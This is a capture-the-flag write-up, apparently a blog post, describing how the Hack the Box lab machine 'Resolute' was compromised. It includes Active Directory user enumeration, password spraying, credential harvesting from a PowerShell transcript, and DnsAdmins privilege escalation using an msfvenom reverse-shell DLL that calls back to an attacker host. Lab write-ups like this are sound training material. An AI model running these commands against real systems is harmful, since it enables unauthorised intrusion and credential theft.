---
layout: post
title: Hack the Box - Resolute
author: Kolja
categories: [HtB]
tags: [ad]
---



## Enumeration
As done in the `HtB-Forest`  box can enumerate users using `rpcclient`:
```
rpcclient -U "" -N 10.10.10.169
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

I also realized, that `enum4linux` displays this information too. Additionally, it gives us the descriptions of the users, which does contain the following:
```
Account created. Password set to Welcome123!
```

## Foothold
We can use the password from the description in combination with our user list to do a password spray attack:
```
crackmapexec smb -u ./userlist.txt -p 'Welcome123!' -d megabank.local 10.10.10.169       
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

This shows, that the `melanie` user has this password. So we now have valid credentials: `melanie/Welcome123!`

We can use these credentials to collect data using the `bloodhound-python` collector:
```
bloodhound-python -c All -u melanie@megabank.local -p 'Welcome123!' -ns 10.10.10.169 -d megabank.local -dc resolute.megabank.local
```

The collected data shows, that our owned user is in a group, that have some WMI privileges:
![wmi group](/assets/htb_resolute_wmi.png)

Additionally, we should be able to use PSRemote to gain access to the DC:
![psremote permissions](/assets/htb_resolute_psremote.png)

We can use `evil-winrm` to confirm this:
```
evil-winrm -i 10.10.10.169 -u Melanie -p 'Welcome123!' 
```

This works and after enumerating the box a bit we can find a file under:
```
C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

This file contains credentials for an additional user:
```
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
These credentials are valid:
```
crackmapexec smb -u ./userlist.txt -p 'Serv3r4Admin4cc123!' -d megabank.local 10.10.10.169
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Serv3r4Admin4cc123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Serv3r4Admin4cc123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Serv3r4Admin4cc123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Serv3r4Admin4cc123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

The data we imported into `bloodhound` tells us, that the user is in the `DNSADMINS` Group:
![DNSAdmin group](htb_resolute_dns_admin.png)

On older systems, this allowed us to escalate our privileges (this should be fixed by now). To exploit this we need a dll, which we can generate  using `msfvenom`:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f dll > test.dll
```

Afterward, we host this dll using `impacket-smbserver` and load it on the target system with the following commands:
```
dnscmd Resolute /config /serverlevelplugindll \\10.10.14.10\kali\test.dll;sc.exe stop dns;sc.exe start dns
```
This gives us a system shell:
```
nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from resolute.megabank.local [10.10.10.169] 49684
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
